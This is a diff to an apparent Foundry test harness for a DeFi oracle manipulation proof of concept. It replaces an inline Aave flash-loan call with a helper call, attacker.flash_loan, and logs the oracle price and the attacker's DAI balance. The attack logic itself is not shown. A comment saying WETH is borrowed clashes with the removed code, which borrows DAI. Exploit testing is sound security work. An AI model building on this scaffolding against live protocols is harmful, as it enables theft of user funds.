@@ -69,37 +69,13 @@ contract OracleManipulationTest is Test {
         console.log("  Price reported by Oracle:", priceInitial / 1e18, "WETH/DAI");
         console.log("  Attacker DAI balance:", attackerDAIBefore / 1e18, "DAI\n");
 
-        // Prepare flash loan parameters
+        // Attacker requests flash loan and performs the attack
         uint256 flashLoanAmount = 500_000 ether; // Borrow 500,000 WETH
         uint256 collateralToDeposit = 10 ether; // Deposit 10 ETH as collateral
-
         console.log("[STEP 1] Flash loan");
         console.log("  Requested amount:", flashLoanAmount / 1e18, "WETH");
         console.log("  Deposited collateral:", collateralToDeposit / 1e18, "ETH");
-
-        // Setup flash loan call
-        address[] memory assets = new address[](1);
-        assets[0] = DAI;
-
-        uint256[] memory amounts = new uint256[](1);
-        amounts[0] = flashLoanAmount;
-
-        uint256[] memory modes = new uint256[](1);
-        modes[0] = 0; // 0 = no debt, must repay in same transaction
-
-        bytes memory params = abi.encode(collateralToDeposit);
-
-        vm.prank(attackerEOA);
-        ILendingPool(AAVE_POOL)
-            .flashLoan(
-                address(attacker),
-                assets,
-                amounts,
-                modes,
-                address(attacker),
-                params,
-                0 // referral code
-            );
+        attacker.flash_loan(flashLoanAmount, collateralToDeposit);
 
         // Record final state
         uint256 attackerDAIAfter = IERC20(DAI).balanceOf(address(attacker));
